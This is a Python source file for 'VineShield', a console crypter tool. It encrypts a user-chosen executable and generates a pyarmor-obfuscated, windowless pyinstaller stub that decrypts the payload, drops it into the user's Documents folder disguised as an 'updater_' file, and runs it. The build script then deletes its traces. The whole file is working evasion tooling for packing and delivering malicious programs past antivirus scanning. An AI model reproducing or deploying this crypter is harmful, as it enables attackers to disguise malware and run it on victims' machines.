'''
 __      __ _                _____  _      _        _      _ 
 \ \    / /(_)              / ____|| |    (_)      | |    | |
  \ \  / /  _  _ __    ___ | (___  | |__   _   ___ | |  __| |
   \ \/ /  | || '_ \  / _ \ \___ \ | '_ \ | | / _ \| | / _` |
    \  /   | || | | ||  __/ ____) || | | || ||  __/| || (_| |
     \/    |_||_| |_| \___||_____/ |_| |_||_| \___||_| \__,_| 
                 
by Nick-Vinesmoke
github: https://github.com/Nick-Vinesmoke
original: https://github.com/Nick-Vinesmoke/VineShield
'''
import os
from getpass import getuser
import webbrowser
from cryptography.fernet import Fernet

class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    VIOLET = '\33[35m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    GREY    = '\33[90m'


class Funcs:
    def Help():
        commandsList = '''
$help\n\tshow commands list
$exit\n\texit from app
$author\n\topen author`s github
$crypt\n\tcrypt file
$dependencies\n\tinstall all dependencies
        '''
        print(style.GREY+commandsList)
    
    def Author():
        webbrowser.open('https://github.com/Nick-Vinesmoke', new=2)

    def Dependencies():
        os.system('''start /wait cmd /c pip install pyinstaller pip install cryptography''')
    
    def Crypt():
        print(style.BLUE+"[?]path to file for crypt",end="")
        print(style.VIOLET+">>> ",end="")
        file_crypt = str(input(style.CYAN))
        file_crypt_name = file_crypt[file_crypt.rfind("\\")+1:]
        print(style.BLUE+"[?]name of build",end="")
        print(style.VIOLET+">>> ",end="")
        name = str(input(style.CYAN))
        print(style.BLUE+"[?]path to icon/none",end="")
        print(style.VIOLET+">>> ",end="")
        icon = str(input(style.CYAN))
        input(style.YELLOW+"[i]press enter to start")
        print(style.GREY)
        try:
            key = Fernet.generate_key()
            f = Fernet(key)
            with open(file_crypt, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data) 
            new_name = f.encrypt(file_crypt_name.encode())
            with open(f"enc_{file_crypt_name}", 'wb') as file:
                file.write(encrypted_data)

            code = fr'''
from cryptography.fernet import Fernet
import os, sys
import subprocess

key = {key}
f = Fernet(key)

name = f.decrypt({new_name}).decode()
try:
    base_path = sys._MEIPASS
except Exception:
    base_path = os.path.abspath(".")
sa = os.path.join(base_path, "enc_" + name)



with open(sa, 'rb') as file:
    encrypted_data = file.read()

decrypted_data = f.decrypt(encrypted_data)

with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name, 'wb') as file:
    file.write(decrypted_data)
subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name)

os._exit(0)
'''
        
            batCode = fr'''
@echo off  
chcp 65001  
color 2  
setlocal enabledelayedexpansion  
set progress=0  
set max=100  
echo Progress: [0%%]
pyarmor gen "{name}.py"  
echo Progress: [10%%]
cd dist  
echo Progress: [40%%]
'''
            if icon == "none":
                batCode += fr'''pyinstaller -F -w --noconsole --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''
            else:
                batCode += fr'''pyinstaller -F -w --noconsole -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''

            batCode += fr'''  
cd dist  
echo Progress: [80%%]
mkdir ..\..\build\  
move "{name}.exe" ../../build  
cd ../../  
RD /s /q dist  
RD /s /q __pycache__  
del /s /q "enc_{file_crypt_name}"  
del /s /q "{name}.py"  
del /s /q "{name}.bat"  
echo "Progress: [100%%]"
echo "The scripted build file is located in the build/ folder"
pause'''
            with open(f"{name}.py", 'w', encoding='utf-8') as f:
                f.write(code)
            with open(f"{name}.bat", 'w', encoding='utf-8') as f:
                f.write(batCode)
            os.startfile(f"{name}.bat")
            input(style.GREEN+"[i]if crypting end...press enter")
            os.system("cls")
        except Exception as error:
            print(error)
            input(style.GREEN+"[i]Fatal_Error...press enter")
        os.system("cls")
        VineShield()



class VineShield:
    def __init__(self) -> None:
        self.Menu()
    def Menu(self) -> None:
        cmd = 'mode 65,30'
        os.system(cmd)
        logo = ''' __      __ _                _____  _      _        _      _ 
 \ \    / /(_)              / ____|| |    (_)      | |    | |
  \ \  / /  _  _ __    ___ | (___  | |__   _   ___ | |  __| |
   \ \/ /  | || '_ \  / _ \ \___ \ | '_ \ | | / _ \| | / _` |
    \  /   | || | | ||  __/ ____) || | | || ||  __/| || (_| |
     \/    |_||_| |_| \___||_____/ |_| |_||_| \___||_| \__,_|'''
        print(style.BLUE+logo)
        self.user = getuser()
        print(style.BLUE+"Welcome to VineShield,",self.user+"!")
        print(style.YELLOW+"[i]type \"$help\" to get commands list\n")
        self.GetInput()

    def GetInput(self) -> None:
        while True:
            print(style.GREEN+self.user,end="~")
            print(style.VIOLET+">>> ",end="")
            command = str(input(style.CYAN))
            self.CommandProc(command)

    def CommandProc(self, command) -> None:
        if(command[0] == "$"):
            command = command[1:]
            match command:
                case "help":
                    Funcs.Help()
                case "exit":
                    exit(0)
                case "author":
                    Funcs.Author()
                case "crypt":
                    Funcs.Crypt()
                case  "dependencies":
                    Funcs.Dependencies()
                case _:
                    print(style.RED+"[!]Error unknown service command")
                    print(style.YELLOW+"[i]type \"$help\" to get commands list\n")
        else:
            print(style.RED+"[!]Error not service command")



if __name__ == "__main__":
    VineShield()